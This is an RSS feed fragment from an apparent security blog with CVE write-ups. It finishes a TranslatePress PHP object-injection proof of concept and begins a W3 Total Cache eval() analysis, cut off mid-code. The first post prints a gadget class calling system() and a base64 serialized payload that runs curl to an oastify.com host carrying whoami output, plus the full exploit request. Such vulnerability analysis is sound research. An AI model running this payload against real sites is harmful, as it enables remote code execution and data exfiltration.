2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create test class in &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send request through BurpSuite proxy&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with &lt;code&gt;trp_updb_extra_params&lt;/code&gt; containing a serialized Base64-encoded payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;trp_updb_extra_params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:75:&amp;#34;curl&amp;ensp;http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)&amp;#34;;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-HTTP&#34; data-lang=&#34;HTTP&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;administrator_cookie&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;action=trp_update_database&amp;amp;trp_updb_nonce=808dff22f9&amp;amp;initiate_update=true&amp;amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#34; title=&#34;Output&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#39; alt=&#34;Result&#34; height=&#34;379&#34; width=&#34;1073&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Output&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The vulnerability originates from directly using &lt;code&gt;unserialize()&lt;/code&gt; on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to &lt;code&gt;json_decode()&lt;/code&gt; in version 2.9.7 removes the attack surface entirely and properly resolves the issue.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; on untrusted input always carries Object Injection and RCE risks.&lt;/li&gt;&#xA;&lt;li&gt;User input must be validated and sanitized before processing.&lt;/li&gt;&#xA;&lt;li&gt;CSRF can escalate an â€œauthenticated exploitâ€ into a â€œsilent exploitationâ€ scenario.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_decode()&lt;/code&gt; is a safer choice for structured data exchange.&lt;/li&gt;&#xA;&lt;li&gt;Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin &amp;lt;= 2.9.6 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9501 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</link>
      <pubDate>Sat, 22 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9501&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9501&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.8.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.8.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/w3-total-cache/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;W3 Total Cache&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.12&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.13&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_parse_dynamic_mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code2&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code2&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_get_contents&lt;/span&gt;&lt;span 